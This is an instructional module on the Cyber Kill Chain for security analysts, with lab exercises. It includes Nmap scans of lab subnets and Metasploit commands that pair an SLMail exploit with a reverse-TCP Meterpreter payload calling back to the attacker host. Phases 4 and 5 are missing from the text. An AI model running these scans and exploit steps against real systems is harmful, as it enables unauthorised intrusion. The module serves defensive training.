# Introduction
Security analysts must be proficient at reconstructing intrusions using threat models such as the Cyber Kill Chain® (also known as the **Intrusion Kill Chain**). By understanding how an adversary's actions further their mission objectives, the threat actor's next move is more accurately anticipated. This module explores the steps taken by adversaries to compromise an information system and demonstrates an entire attack cycle to retrieve sensitive information from a target.

This training highlights each phase of the Cyber Kill Chain, including techniques and scenarios, followed by knowledge check questions for each phase. The end of the module consists of five additional knowledge checks, which incorporate covered topics from the entire course.
## Topics
- Cyber Kill Chain and its relation to cyber attacks.
- Cyber Kill Chain phases and their application to tracking adversary behaviors.
## Learning Outcomes
- Identify the appropriate Cyber Kill Chain phase that corresponds to the attack.
- Demonstrate how attackers leverage every phase of the Cyber Kill Chain to compromise a target system.
- Identify suspicious files or activities on a machine or target network.
## Toolkit
- Linux attack virtual machine
- Windows target virtual machine running *vulnerable* software
- Network Tools: *Nmap, rdesktop, Netcat*
- *Metasploit*
# Cyber Kill Chain® Defined
The Cyber Kill Chain is a framework that helps *cybersecurity professionals methodically and thoroughly analyze threats* and is useful when adopting a red team or attacker perspective. It is a seven-phase model for adversary cyber operations created by Lockheed Martin. The Cyber Kill Chain helps analysts understand how an attacker's actions correlate to their strategic mission.﻿

While examining an incident as an entire attack lifecycle, threat intelligence analysts can observe **tactics, techniques, and procedures (TTPs)** performed at each stage. The goal is to effectively anticipate an adversary's maneuvers and preemptively deny access or mitigate the impact of a current or future compromise.
## Phases of the Cyber Kill Chain

![[629ff22d-743c-4e40-91a7-5f1996afba9e.png]]
# Phase 1: Reconnaissance
The first phase of the Cyber Kill Chain, reconnaissance, covers initial information gathering before the adversary begins an attack. Reconnaissance can be leveraged in an attack cycle in several ways, from identifying potential access vectors to determining the most viable target for conducting an attack.

![[8fcd1ef1-26f0-45b2-b0f5-434b532adb83.png]]
When attackers survey a target, they look for as much information as possible, such as network technologies and exposed services. Network technologies include unique protocols, hardware, and software standards such as *optical, broadband, and radio, providing varying access vectors.* Services that may be exposed to publicly available networks or even the internet include the following:
- File Transfer Protocol **(FTP)**
- Simple Mail Transfer Protocol **(SMTP)**
- Remote Desktop (rdesktop)
- Telnet

Key data elements an attacker can leverage, which initial reconnaissance methods can gather, include:
- Enumeration (list, identify, and research) of internet-facing assets .
- IP ranges and associated domain names, ports, and services .
- Implemented technologies and/or application platforms.
- Leaked credentials or keys .
- Leaked documents, logs, configuration files, backup files .

**Spear-phishing is a type of attack that is reliant on the reconnaissance phase**. The adversary could gain knowledge of press releases and an organization's or an employee's social media presence through reconnaissance. This aids attackers in identifying targets and creating relevant content for phishing messages likely to cause clicks.
# Reconnaissance Techniques
Threat actors can aggregate actionable data about a target entity through *Open Source Intelligence (OSINT) collection*. OSINT is the method of gathering information through publicly available sources on the internet. There are three types of information gathering in security:
- Passive
- Semi-passive
- Active
## Passive
Passive OSINT techniques do not engage or interact with the target entity. These methods require that no artifacts or traces of the queries are left behind for the target to discover.

Techniques of passive reconnaissance include the following:
- Collecting public information and records regarding network or person.
- Aggregating unprotected social media information.
- Recovering previous versions of the target's website (**WayBack** Machine) .
- Querying search engines such as Google or *Shodan* for exposed devices or services belonging to the target .
## Semi-passive
Semi-passive OSINT techniques directly interface with the target but in a **plausible, deniable way and blend in with standard traffic**. Techniques may include interacting with a target's website or other online services, blending into the white noise of regular traffic, and performing all actions from a non-attributable IP/domain. If the attacker is detected later in the Cyber Kill Chain by the target, all evidence of these methods would be non-attributable.
## Active
Active OSINT techniques directly interface with a target and **can leave an identifiable signature**. An example of an active OSINT technique is a port scan. Every IP-enabled device hosts services on numbered ports, like digital versions of those on the back of a *SoHo router*, which enable the device to appropriately direct traffic to the relevant application. Conducting a port scan rapidly queries available ports on a target and can provide substantial information to aid an attack. However, many modern security systems are configured to detect and flag such activity as malicious.
# Scenario: Reconnaissance Techniques

This module's scenario begins with conducting active reconnaissance against a target. Nmap is used to run a port scan against a target, which returns open ports and services running on those ports.
## Nmap
Nmap is a common network reconnaissance tool used for conducting port scans. It runs in various configurations but generally sends a signal to ports on a target device to assess if they are listening for connections (open). By default, Nmap scans common ports, but can be forced to scan all ports (1-65535) by adding the `-p-` option. A basic Nmap scan is:
```
student@simspace> nmap 192.168.3.2
```

Nmap also identifies which hosts are present on a given network
## LAB: Perform Active Reconnaissance

As the attacker, perform active reconnaissance against a target network. Determine the IP address of a valid host on the target network. Compare the results after removing your own IP from the list (this can be found with the `ip a` command).
1. Log in to the `attacker` VM.﻿﻿
2. Open a terminal window.
3. Scan the subnet `192.168.1.0/24` with the command shown below. The scan may take several minutes to complete.
```
student@simspace> nmap 192.168.3.0/24
```
## Port Scanning

Nmap returns service headers for services running on open ports. Service headers aid attackers in reconnaissance by enabling them to search specific software and version numbers for publicly available exploits.
## LAB: Identify Open Ports

1. In a terminal window, scan `192.168.3.2` using the `Nmap` command below to identify which ports are listening for connections:

```
nmap -sSVC -A -p25,110,3389 192.168.3.2
```

_NOTE: If the target is not returning an email service, the target could still be configuring. Wait one to two minutes and try again. Nmap provides a warning about being run in an insecure faction. The attacker machine is configured to enable easy scanning and always runs as root._
# Phase 2: Weaponization

The section on reconnaissance discussed how attackers identify a viable entry into the target network and/or device. Access to a network or device often requires exploiting a software vulnerability or crafting an enticing social engineering ploy to compel an employee to open a link to a malicious email or website.
In situations where the attacker requires a custom-crafted malicious payload, the weaponization phase is when the parameters of this malware are defined, compiled, and tested. This phase aims to ensure an initial point of presence in the victim's network and subsequently enable additional access.
The weaponization phase is informed by the results of the reconnaissance phase. For example, with successful information gathering, a threat actor can determine the host endpoint protections in a victim's environment. Upon compiling and testing their malicious payload, attempts can be made to evade that specific technology's detection.
The weaponization phase may take more time if special needs for the exploit or payloads need to be developed. Advanced attacks may require research and development in an isolated lab environment before conducting an actual attack. There may be unknowns in any remote cyber attack. Even if the exploit works, the payload may fail and need to be reworked.
# Weaponization Techniques

An attacker utilizes private, custom, or open-source exploits to exploit an identified vulnerability in the target's network. The actor weaponizes their tool to match the unique system and network architecture requirements of the target they intend to attack. Additionally, they often implement obfuscation techniques to evade network and host detection capabilities.

_Note: There are no guaranteed defenses against some weaponization techniques, such as with a zero-day (below)._

Examples of weaponization techniques:
- **Obfuscate** (encrypt/encode/reorder/etc) malicious executable to evade **AntiVirus** (AV) detection
- Modify open-source exploits to target a specific target's IP and security configuration
- Build a custom exploit against a target device or platform (zero-day)
## Weaponize Payload
1. In the `attacker` VM terminal window, enter the command `msfconsole`.
2. Search for an exploit to leverage against the target’s vulnerable SLMail application.
	- Execute `search slmail` followed by `use` `exploit/windows/pop3/seattlelab_pass`.
	- Alternatively, the `use` command can be executed, followed by the appropriate number for the SLMail exploit, as shown in the screenshot below.
3. Weaponize the payload by running the following command to set a payload and cause the target machine to call back to the attacking machine with full system privileges:

```
set payload windows/meterpreter/reverse_tcp
```

Run the following commands in Metasploit to weaponize the SLMail payload:

```
set RHOSTS 192.168.3.2
set LHOST 192.168.3.5
```

Rerun the `options` command to check the inputs.
# Phase 3: Delivery

A successful delivery phase is critical to the adversary campaign. An attacker may send the malicious payload to the target and entice the user to execute or automatically execute the code remotely. There are numerous ways to deliver the exploit:

- Email (phishing)
- Weaponized digital documents
- Remote service exploitation
- Physical media (thumb drive, etc.)
- Man in the Middle
- Hardware exploitation
- Source code compromise
- Website downloads (cloud Sharing, web portals, etc.)
# Delivery Techniques

Payload delivery is a crucial piece of the attack. An attacker often attempts to deliver an exploit via a malicious attachment or entices a user to click a link, prompting a malicious download. ﻿

Below is a successful phishing campaign that enticed recipients to click an email link and directed those users to a fake O365 logon page.
The most dangerous vulnerabilities allow attackers to deliver the payload directly to a vulnerable, exposed service and remotely execute malicious code. Remote code execution ("RCE") vulnerabilities are leveraged in SLMail exploitation exercises.

# Phase 6: Command and Control
Regardless of the communication method, the purpose of Command and Control (C2) is to maintain control of compromised assets to perform additional operations and requires three components:

![[616993a3-9be1-4e13-97cc-6e699f1ecb31.png]]

Generally, C2 traffic conforms to one of two paradigms: scheduled or on-demand
## Scheduled C2

This paradigm generally involves an installed program or service that reaches out to an attacker-controlled resource for its management instructions. This control requires the attacker to have procured or compromised another resource on the internet, which is more predictable. Still, the nature of taking commands through an outbound connection means that this kind can be installed on devices that do not have directly internet-accessible interfaces (such as those behind a firewall).

## On-demand C2

This paradigm requires the service or port to be accessible to the attacker, which may not be possible depending on the network topology. Installations that respond to on-demand C2 can include malware configured to listen on an otherwise unused port and remote control services like RDP or SSH if associated accounts have been compromised.

The desirable attributes of a C2 channel are generally consistent. They are:
- **Stealthy**. The data flow in the channel is either hidden under encryption or obscured by mimicking normal network traffic through similar channels (or both),
- **Indistinct.** The command source and victim machine appear related, so traffic between them does not stand out,
- **Unpredictable.** The command source location comes from anywhere or can be changed at any time,
- **Redundant.** The channel is difficult to shut down or block if discovered.

Rarely are all four attributes available to an attacker. For instance, access by SSH provides encryption, but SSH traffic from an unknown source through a network edge likely appears suspicious to network defenders. As with installation, knowing which C2 channel is appropriate for the respective environment is both an art and a science, which may require extensive triage.
# Phase 7: Actions on Objective
If the attack is successful, the attacker begins the next phase of the mission. This phase of the Cyber Kill Chain®, Actions on Objective (AoO), is primarily defined by the ultimate goal of the attacker's campaign. Typical actions at this stage include enumerating attached devices, credential harvesting, Active Directory compromise, and stealing sensitive files. Extreme examples of threat actors' next steps in this final phase include disruption of network services and/or data destruction.

During the AoO phase, the attacker is interactive and on target, using its access and resources to further the attack or staying quiet and passively monitoring network and system activities. During this interactive portion of the attack, the attacker experiences the highest risk of exposure; therefore, tradecraft is essential. Advanced Persistent Threats (APTs) are skilled at hiding, whereas less-skilled attackers or those with a shorter timeline do not use stealth and may be uninterested in being caught.

Examples of Actions on Objective:
- File or email collection
- Changes to system or network settings
- Pivoting to other devices on the network
- Destruction of devices
- Denial of service
## Actions on Objective: Data Exfiltration
An analyst may identify evidence of an anomalous volume of outbound traffic consistent with data exfiltration. This data transfer is not necessarily spotted heading to an external host but may be detected in transit from one subnet to another within the victim's network.

Indicators of data exfiltration might include:
- Shifts in account or data access patterns from baseline.
- Data Loss Prevention (DLP) hits on sensitive project names.
- A newly created file in an unusual directory of an unusually large size.
- Anomalous traffic between internal hosts or many bytes from internal hosts is sent out of the network.
